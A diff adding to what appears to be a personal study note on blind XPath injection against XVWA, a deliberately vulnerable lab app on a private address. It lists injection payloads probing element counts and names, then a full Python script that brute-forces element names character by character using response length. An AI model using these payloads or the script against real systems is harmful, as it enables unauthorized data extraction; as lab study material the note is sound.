@@ -500,3 +500,90 @@ But inside the next tag only exists five **tags**
 
 We can add this in own data.xml file
 ![](../../Images/Pasted%20image%2020230904171725.png)
+
+You can enum the size of the rest of tags:
+
+````bash
+search=1' and count(/*[1]/*[2]/*)='5&submit=
+````
+
+## Discover the attributes of the secondary tags
+
+````bash
+search=1' and name(/*[1]/*[1]/*[1])='ID&submit=
+````
+
+You can use substring
+
+````bash
+search=1' and substring(name(/*[1]/*[1]/*[1]),1,1)='I&submit=
+````
+
+We are going to automatize this to our script
+
+To not complicate the process we are going to image that the attributes don't have more than 20 characters
+
+We know that there are five attributes, we adjust our loop to this
+
+````python
+#!/usr/bin/python3
+
+from pwn import *
+import time, sys, pdb, string, signal, requests
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+
+main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
+characters = string.ascii_letters # Characters in lowercase and uppercase
+
+def xPathInjection():
+    
+    data = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Data")
+
+    for first_position in range(1, 6):    
+        for second_position in range(1,21):
+            for character in characters:                    
+                
+                post_data = { 
+                        'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
+                        'submit': '' 
+                }
+    
+                r = requests.post(main_url, data=post_data)
+
+
+                if len(r.text) != 8691 and len(r.text) != 8692 :
+                    data += character
+                    p2.status(data)
+
+                    # ----------------------
+                    # TODO
+                    break
+                    # ----------------------
+
+        if first_position != 5:
+            data += ":"
+
+    p1.success("Brute force attack finished")
+    p2.success(data)
+
+if __name__ == '__main__':
+    
+    xPathInjection()
+
+````
